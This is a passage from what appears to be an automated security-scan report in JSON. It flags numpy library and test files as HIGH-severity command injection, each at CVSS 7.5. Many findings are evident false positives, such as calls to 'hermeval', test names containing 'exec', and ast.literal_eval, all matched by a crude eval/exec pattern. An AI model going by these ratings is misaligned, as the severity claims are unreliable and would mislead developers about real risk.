            "vulnerability": "COMMAND_INJECTION",
            "evidence": "return eval('lambda v,f=f:not f(v)')",
            "context": "\n\ndef l_not(f):\n    return eval('lambda v,f=f:not f(v)')\n\n\ndef isdummyroutine(rout):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/crackfortran.py",
            "line": 1330,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "v = eval(initexpr, {}, params)",
            "context": "                    initexpr = initexpr[1:].lower().replace('d', 'e').\\\n                        replace(',', '+1j*(')\n            try:\n                v = eval(initexpr, {}, params)\n            except (SyntaxError, NameError, TypeError) as msg:\n                errmess('analyzeline: Failed to evaluate %r. Ignoring: %s\\n'\n                        % (initexpr, msg))",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/crackfortran.py",
            "line": 2280,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def myeval(e, g=None, l=None):",
            "context": "    return implicitrules, attrrules\n\n\ndef myeval(e, g=None, l=None):\n    \"\"\" Like `eval` but returns only integers and floats \"\"\"\n    r = eval(e, g, l)\n    if type(r) in [int, float]:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/crackfortran.py",
            "line": 2282,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "r = eval(e, g, l)",
            "context": "\ndef myeval(e, g=None, l=None):\n    \"\"\" Like `eval` but returns only integers and floats \"\"\"\n    r = eval(e, g, l)\n    if type(r) in [int, float]:\n        return r\n    raise ValueError('r=%r' % (r))",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/crackfortran.py",
            "line": 2312,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "c = int(myeval(e, {}, {}))",
            "context": "    (2.0, 3.0, 'x')\n    \"\"\"\n    try:\n        c = int(myeval(e, {}, {}))\n        return 0, c, None\n    except Exception:\n        pass",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/crackfortran.py",
            "line": 2334,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "b = myeval(ee, {}, {})",
            "context": "                    ee = '%s(%s)%s' % (\n                        m1.group('before'), 0, m1.group('after'))\n                    m1 = re_1.match(ee)\n                b = myeval(ee, {}, {})\n                m1 = re_1.match(e)\n                while m1:\n                    ee = '%s(%s)%s' % (",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/crackfortran.py",
            "line": 2340,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "a = myeval(ee, {}, {}) - b",
            "context": "                    ee = '%s(%s)%s' % (\n                        m1.group('before'), 1, m1.group('after'))\n                    m1 = re_1.match(ee)\n                a = myeval(ee, {}, {}) - b\n                m1 = re_1.match(e)\n                while m1:\n                    ee = '%s(%s)%s' % (",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/crackfortran.py",
            "line": 2346,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "c = myeval(ee, {}, {})",
            "context": "                    ee = '%s(%s)%s' % (\n                        m1.group('before'), 0.5, m1.group('after'))\n                    m1 = re_1.match(ee)\n                c = myeval(ee, {}, {})\n                # computing another point to be sure that expression is linear\n                m1 = re_1.match(e)\n                while m1:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/crackfortran.py",
            "line": 2353,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "c2 = myeval(ee, {}, {})",
            "context": "                    ee = '%s(%s)%s' % (\n                        m1.group('before'), 1.5, m1.group('after'))\n                    m1 = re_1.match(ee)\n                c2 = myeval(ee, {}, {})\n                if (a * 0.5 + b == c and a * 1.5 + b == c2):\n                    return a, b, x\n            except Exception:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/crackfortran.py",
            "line": 2544,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "params[n] = param_eval(v, g_params, params, dimspec=dimspec)",
            "context": "            elif real8pattern.search(v):\n                v = 4\n            try:\n                params[n] = param_eval(v, g_params, params, dimspec=dimspec)\n            except Exception as msg:\n                params[n] = v\n                outmess(f'get_parameters: got \"{msg}\" on {n!r}\\n')",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/crackfortran.py",
            "line": 2574,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "value = eval(value, {}, params)",
            "context": "        value = value.split('_')[0]\n    try:\n        # TODO: use symbolic from PR #19805\n        value = eval(value, {}, params)\n        value = (repr if isinstance(value, str) else str)(value)\n    except (NameError, SyntaxError, TypeError):\n        return value",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/crackfortran.py",
            "line": 2652,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "l = str(eval(l, {}, params))",
            "context": "            if 'len' in vars[n]['charselector']:\n                l = vars[n]['charselector']['len']\n                try:\n                    l = str(eval(l, {}, params))\n                except Exception:\n                    pass\n                vars[n]['charselector']['len'] = l",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/crackfortran.py",
            "line": 2661,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "l = str(eval(l, {}, params))",
            "context": "            if 'kind' in vars[n]['kindselector']:\n                l = vars[n]['kindselector']['kind']\n                try:\n                    l = str(eval(l, {}, params))\n                except Exception:\n                    pass\n                vars[n]['kindselector']['kind'] = l",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/crackfortran.py",
            "line": 2929,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "kindselect['kind'] = eval(",
            "context": "                        if kindselect:\n                            if 'kind' in kindselect:\n                                try:\n                                    kindselect['kind'] = eval(\n                                        kindselect['kind'], {}, params)\n                                except Exception:\n                                    pass",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/crackfortran.py",
            "line": 2979,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def param_eval(v, g_params, params, dimspec=None):",
            "context": "analyzeargs_re_1 = re.compile(r'\\A[a-z]+[\\w$]*\\Z', re.I)\n\n\ndef param_eval(v, g_params, params, dimspec=None):\n    \"\"\"\n    Creates a dictionary of indices and values for each parameter in a\n    parameter array to be evaluated later.",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/crackfortran.py",
            "line": 3000,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "p = eval(v, g_params, params)",
            "context": "    \"\"\"\n    if dimspec is None:\n        try:\n            p = eval(v, g_params, params)\n        except Exception as msg:\n            p = v\n            outmess(f'param_eval: got \"{msg}\" on {v!r}\\n')",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/crackfortran.py",
            "line": 3031,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "item = eval(item, g_params, params)",
            "context": "    v_eval = []\n    for item in v:\n        try:\n            item = eval(item, g_params, params)\n        except Exception as msg:\n            outmess(f'param_eval: got \"{msg}\" on {item!r}\\n')\n        v_eval.append(item)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/crackfortran.py",
            "line": 3489,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "v = eval(v)",
            "context": "            v = vars[a]['=']\n            if vars[a]['typespec'] in ['complex', 'double complex']:\n                try:\n                    v = eval(v)\n                    v = '(%s,%s)' % (v.real, v.imag)\n                except Exception:\n                    pass",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/capi_maps.py",
            "line": 157,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "d = eval(f.read().lower(), {}, {})",
            "context": "    try:\n        outmess('Reading f2cmap from {!r} ...\\n'.format(f2cmap_file))\n        with open(f2cmap_file) as f:\n            d = eval(f.read().lower(), {}, {})\n        f2cmap_all, f2cmap_mapped = process_f2cmap_dict(f2cmap_all, d, c2py_map, True)\n        outmess('Successfully applied user defined f2cmap changes\\n')\n    except Exception as msg:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/capi_maps.py",
            "line": 295,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "ret['size'] = repr(eval(ret['size']))",
            "context": "        dim = copy.copy(var['dimension'])\n        ret['size'] = '*'.join(dim)\n        try:\n            ret['size'] = repr(eval(ret['size']))\n        except Exception:\n            pass\n        ret['dims'] = ','.join(dim)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/capi_maps.py",
            "line": 451,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "v = eval(v, {}, {})",
            "context": "                    ret['init.r'], ret['init.i'] = markoutercomma(\n                        v[1:-1]).split('@,@')\n                else:\n                    v = eval(v, {}, {})\n                    ret['init.r'], ret['init.i'] = str(v.real), str(v.imag)\n            except Exception:\n                raise ValueError(",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/_internal.py",
            "line": 204,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "newitem = (dtype, ast.literal_eval(repeats))",
            "context": "                    'is deprecated; pass either a single number or indicate '\n                    'a tuple with a comma, like \"(2,)\".', DeprecationWarning,\n                    stacklevel=2)\n            newitem = (dtype, ast.literal_eval(repeats))\n\n        result.append(newitem)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/arrayprint.py",
            "line": 1545,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": ">>> assert eval(dtype_short_repr(dt)) == dt",
            "context": "\n    >>> from numpy import *\n    >>> dt = np.int64([1, 2]).dtype\n    >>> assert eval(dtype_short_repr(dt)) == dt\n    \"\"\"\n    if type(dtype).__repr__ != np.dtype.__repr__:\n        # TODO: Custom repr for user DTypes, logic should likely move.",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/polynomial/tests/test_hermite_e.py",
            "line": 81,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "val1 = herme.hermeval(self.x, pol1)",
            "context": "        # check values of result\n        for i in range(5):\n            pol1 = [0]*i + [1]\n            val1 = herme.hermeval(self.x, pol1)\n            for j in range(5):\n                msg = f\"At i={i}, j={j}\"\n                pol2 = [0]*j + [1]",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/polynomial/tests/test_hermite_e.py",
            "line": 85,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "val2 = herme.hermeval(self.x, pol2)",
            "context": "            for j in range(5):\n                msg = f\"At i={i}, j={j}\"\n                pol2 = [0]*j + [1]\n                val2 = herme.hermeval(self.x, pol2)\n                pol3 = herme.hermemul(pol1, pol2)\n                val3 = herme.hermeval(self.x, pol3)\n                assert_(len(pol3) == i + j + 1, msg)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/polynomial/tests/test_hermite_e.py",
            "line": 87,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "val3 = herme.hermeval(self.x, pol3)",
            "context": "                pol2 = [0]*j + [1]\n                val2 = herme.hermeval(self.x, pol2)\n                pol3 = herme.hermemul(pol1, pol2)\n                val3 = herme.hermeval(self.x, pol3)\n                assert_(len(pol3) == i + j + 1, msg)\n                assert_almost_equal(val3, val1*val2, err_msg=msg)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/polynomial/tests/test_hermite_e.py",
            "line": 122,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def test_hermeval(self):",
            "context": "    x = np.random.random((3, 5))*2 - 1\n    y = polyval(x, [1., 2., 3.])\n\n    def test_hermeval(self):\n        #check empty input\n        assert_equal(herme.hermeval([], [1]).size, 0)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/polynomial/tests/test_hermite_e.py",
            "line": 124,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert_equal(herme.hermeval([], [1]).size, 0)",
            "context": "\n    def test_hermeval(self):\n        #check empty input\n        assert_equal(herme.hermeval([], [1]).size, 0)\n\n        #check normal input)\n        x = np.linspace(-1, 1)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/polynomial/tests/test_hermite_e.py",
            "line": 132,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = herme.hermeval(x, [0]*i + [1])",
            "context": "        for i in range(10):\n            msg = f\"At i={i}\"\n            tgt = y[i]\n            res = herme.hermeval(x, [0]*i + [1])\n            assert_almost_equal(res, tgt, err_msg=msg)\n\n        #check that shape is preserved",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/polynomial/tests/test_hermite_e.py",
            "line": 139,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert_equal(herme.hermeval(x, [1]).shape, dims)",
            "context": "        for i in range(3):\n            dims = [2]*i\n            x = np.zeros(dims)\n            assert_equal(herme.hermeval(x, [1]).shape, dims)\n            assert_equal(herme.hermeval(x, [1, 0]).shape, dims)\n            assert_equal(herme.hermeval(x, [1, 0, 0]).shape, dims)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/polynomial/tests/test_hermite_e.py",
            "line": 140,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert_equal(herme.hermeval(x, [1, 0]).shape, dims)",
            "context": "            dims = [2]*i\n            x = np.zeros(dims)\n            assert_equal(herme.hermeval(x, [1]).shape, dims)\n            assert_equal(herme.hermeval(x, [1, 0]).shape, dims)\n            assert_equal(herme.hermeval(x, [1, 0, 0]).shape, dims)\n\n    def test_hermeval2d(self):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/polynomial/tests/test_hermite_e.py",
            "line": 141,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert_equal(herme.hermeval(x, [1, 0, 0]).shape, dims)",
            "context": "            x = np.zeros(dims)\n            assert_equal(herme.hermeval(x, [1]).shape, dims)\n            assert_equal(herme.hermeval(x, [1, 0]).shape, dims)\n            assert_equal(herme.hermeval(x, [1, 0, 0]).shape, dims)\n\n    def test_hermeval2d(self):\n        x1, x2, x3 = self.x",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/polynomial/tests/test_hermite_e.py",
            "line": 239,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert_almost_equal(herme.hermeval(-1, hermeint), i)",
            "context": "            pol = [0]*i + [1]\n            hermepol = herme.poly2herme(pol)\n            hermeint = herme.hermeint(hermepol, m=1, k=[i], lbnd=-1)\n            assert_almost_equal(herme.hermeval(-1, hermeint), i)\n\n        # check single integration with integration constant and scaling\n        for i in range(5):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/polynomial/tests/test_hermite_e.py",
            "line": 360,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert_almost_equal(v[..., i], herme.hermeval(x, coef))",
            "context": "        assert_(v.shape == (3, 4))\n        for i in range(4):\n            coef = [0]*i + [1]\n            assert_almost_equal(v[..., i], herme.hermeval(x, coef))\n\n        # check for 2d x\n        x = np.array([[1, 2], [3, 4], [5, 6]])",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/polynomial/tests/test_hermite_e.py",
            "line": 368,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert_almost_equal(v[..., i], herme.hermeval(x, coef))",
            "context": "        assert_(v.shape == (3, 2, 4))\n        for i in range(4):\n            coef = [0]*i + [1]\n            assert_almost_equal(v[..., i], herme.hermeval(x, coef))\n\n    def test_hermevander2d(self):\n        # also tests hermeval2d for non-square coefficient array",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/polynomial/tests/test_hermite_e.py",
            "line": 425,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert_almost_equal(herme.hermeval(x, coef3), y)",
            "context": "        #\n        coef3 = herme.hermefit(x, y, 3)\n        assert_equal(len(coef3), 4)\n        assert_almost_equal(herme.hermeval(x, coef3), y)\n        coef3 = herme.hermefit(x, y, [0, 1, 2, 3])\n        assert_equal(len(coef3), 4)\n        assert_almost_equal(herme.hermeval(x, coef3), y)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/polynomial/tests/test_hermite_e.py",
            "line": 428,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert_almost_equal(herme.hermeval(x, coef3), y)",
            "context": "        assert_almost_equal(herme.hermeval(x, coef3), y)\n        coef3 = herme.hermefit(x, y, [0, 1, 2, 3])\n        assert_equal(len(coef3), 4)\n        assert_almost_equal(herme.hermeval(x, coef3), y)\n        #\n        coef4 = herme.hermefit(x, y, 4)\n        assert_equal(len(coef4), 5)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/polynomial/tests/test_hermite_e.py",
            "line": 432,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert_almost_equal(herme.hermeval(x, coef4), y)",
            "context": "        #\n        coef4 = herme.hermefit(x, y, 4)\n        assert_equal(len(coef4), 5)\n        assert_almost_equal(herme.hermeval(x, coef4), y)\n        coef4 = herme.hermefit(x, y, [0, 1, 2, 3, 4])\n        assert_equal(len(coef4), 5)\n        assert_almost_equal(herme.hermeval(x, coef4), y)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/polynomial/tests/test_hermite_e.py",
            "line": 435,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert_almost_equal(herme.hermeval(x, coef4), y)",
            "context": "        assert_almost_equal(herme.hermeval(x, coef4), y)\n        coef4 = herme.hermefit(x, y, [0, 1, 2, 3, 4])\n        assert_equal(len(coef4), 5)\n        assert_almost_equal(herme.hermeval(x, coef4), y)\n        # check things still work if deg is not in strict increasing\n        coef4 = herme.hermefit(x, y, [2, 3, 4, 1, 0])\n        assert_equal(len(coef4), 5)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/polynomial/tests/test_hermite_e.py",
            "line": 439,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert_almost_equal(herme.hermeval(x, coef4), y)",
            "context": "        # check things still work if deg is not in strict increasing\n        coef4 = herme.hermefit(x, y, [2, 3, 4, 1, 0])\n        assert_equal(len(coef4), 5)\n        assert_almost_equal(herme.hermeval(x, coef4), y)\n        #\n        coef2d = herme.hermefit(x, np.array([y, y]).T, 3)\n        assert_almost_equal(coef2d, np.array([coef3, coef3]).T)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/polynomial/tests/test_hermite_e.py",
            "line": 468,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert_almost_equal(herme.hermeval(x, coef1), y)",
            "context": "        x = np.linspace(-1, 1)\n        y = f2(x)\n        coef1 = herme.hermefit(x, y, 4)\n        assert_almost_equal(herme.hermeval(x, coef1), y)\n        coef2 = herme.hermefit(x, y, [0, 2, 4])\n        assert_almost_equal(herme.hermeval(x, coef2), y)\n        assert_almost_equal(coef1, coef2)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/polynomial/tests/test_hermite_e.py",
            "line": 470,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert_almost_equal(herme.hermeval(x, coef2), y)",
            "context": "        coef1 = herme.hermefit(x, y, 4)\n        assert_almost_equal(herme.hermeval(x, coef1), y)\n        coef2 = herme.hermefit(x, y, [0, 2, 4])\n        assert_almost_equal(herme.hermeval(x, coef2), y)\n        assert_almost_equal(coef1, coef2)\n\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/polynomial/tests/test_hermite_e.py",
            "line": 516,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = herme.hermeval(roots, pol)",
            "context": "        for i in range(1, 5):\n            roots = np.cos(np.linspace(-np.pi, 0, 2*i + 1)[1::2])\n            pol = herme.hermefromroots(roots)\n            res = herme.hermeval(roots, pol)\n            tgt = 0\n            assert_(len(pol) == i + 1)\n            assert_almost_equal(herme.herme2poly(pol)[-1], 1)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/testing/_private/utils.py",
            "line": 1294,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(astr, dict)",
            "context": "\n\ndef runstring(astr, dict):\n    exec(astr, dict)\n\n\ndef assert_string_equal(actual, desired):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/testing/_private/utils.py",
            "line": 1580,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(code, globs, locs)",
            "context": "    elapsed = jiffies()\n    while i < times:\n        i += 1\n        exec(code, globs, locs)\n    elapsed = jiffies() - elapsed\n    return 0.01 * elapsed\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/tests/test_crackfortran.py",
            "line": 260,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "class TestEval(util.F2PyTest):",
            "context": "        assert mod[0][\"vars\"][\"abar\"][\"=\"] == \"bar('abar')\"\n\n\nclass TestEval(util.F2PyTest):\n    def test_eval_scalar(self):\n        eval_scalar = crackfortran._eval_scalar\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/tests/test_crackfortran.py",
            "line": 369,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "ret = crackfortran.param_eval(v, g_params, params, dimspec=dimspec)",
            "context": "        params = {'dp': 8, 'intparamarray': {1: 3, 2: 5},\n                  'nested': {1: 1, 2: 2, 3: 3}}\n        dimspec = '(2)'\n        ret = crackfortran.param_eval(v, g_params, params, dimspec=dimspec)\n        assert ret == {1: 3.14, 2: 4.0}\n\n    def test_param_eval_nonstandard_range(self):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/tests/test_crackfortran.py",
            "line": 379,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "ret = crackfortran.param_eval(v, g_params, params, dimspec=dimspec)",
            "context": "                selected_real_kind=crackfortran._selected_real_kind_func)\n        params = {}\n        dimspec = '(-1:1)'\n        ret = crackfortran.param_eval(v, g_params, params, dimspec=dimspec)\n        assert ret == {-1: 6, 0: 3, 1: 1}\n\n    def test_param_eval_empty_range(self):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/tests/test_crackfortran.py",
            "line": 398,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "ret = crackfortran.param_eval(v, g_params, params, dimspec=None)",
            "context": "                selected_int_kind=crackfortran._selected_int_kind_func,\n                selected_real_kind=crackfortran._selected_real_kind_func)\n        params = {}\n        ret = crackfortran.param_eval(v, g_params, params, dimspec=None)\n        assert ret == '3.14_dp'\n\n    def test_param_eval_too_many_dims(self):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/tests/test_f2py2e.py",
            "line": 847,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def test_npd_f77exec():",
            "context": "    pass\n\n\ndef test_npd_f77exec():\n    \"\"\"\n    CLI :: -c --f77exec\n    \"\"\"",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/tests/test_f2py2e.py",
            "line": 855,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def test_npd_f90exec():",
            "context": "    pass\n\n\ndef test_npd_f90exec():\n    \"\"\"\n    CLI :: -c --f90exec\n    \"\"\"",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/tests/test_deprecations.py",
            "line": 644,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.assert_deprecated(lambda: safe_eval(\"None\"))",
            "context": "        from numpy.lib.tests.test_io import TextIO\n        from numpy import in1d, row_stack, trapz\n\n        self.assert_deprecated(lambda: safe_eval(\"None\"))\n\n        data_gen = lambda: TextIO('A,B\\n0,1\\n2,3')\n        kwargs = dict(delimiter=\",\", missing_values=\"N/A\", names=True)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/tests/test_dtype.py",
            "line": 1057,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert_equal(np.dtype(eval(str(dt))), dt)",
            "context": "                         \"'offsets':[0,76800], \"\n                         \"'itemsize':80000, \"\n                         \"'aligned':True}\")\n        assert_equal(np.dtype(eval(str(dt))), dt)\n\n        dt = np.dtype({'names': ['r', 'g', 'b'], 'formats': ['u1', 'u1', 'u1'],\n                        'offsets': [0, 1, 2],",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/tests/test_umath_accuracy.py",
            "line": 68,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "inval  = np.array(str_to_float(data_subset['input'].astype(str), data_subset['type'].astype(str)), dtype=eval(datatype))",
            "context": "                    npfunc = getattr(np, npname)\n                    for datatype in np.unique(data['type']):\n                        data_subset = data[data['type'] == datatype]\n                        inval  = np.array(str_to_float(data_subset['input'].astype(str), data_subset['type'].astype(str)), dtype=eval(datatype))\n                        outval = np.array(str_to_float(data_subset['output'].astype(str), data_subset['type'].astype(str)), dtype=eval(datatype))\n                        perm = np.random.permutation(len(inval))\n                        inval = inval[perm]",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/tests/test_umath_accuracy.py",
            "line": 69,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "outval = np.array(str_to_float(data_subset['output'].astype(str), data_subset['type'].astype(str)), dtype=eval(datatype))",
            "context": "                    for datatype in np.unique(data['type']):\n                        data_subset = data[data['type'] == datatype]\n                        inval  = np.array(str_to_float(data_subset['input'].astype(str), data_subset['type'].astype(str)), dtype=eval(datatype))\n                        outval = np.array(str_to_float(data_subset['output'].astype(str), data_subset['type'].astype(str)), dtype=eval(datatype))\n                        perm = np.random.permutation(len(inval))\n                        inval = inval[perm]\n                        outval = outval[perm]",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/tests/test_simd.py",
            "line": 241,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "func = eval(intrin)",
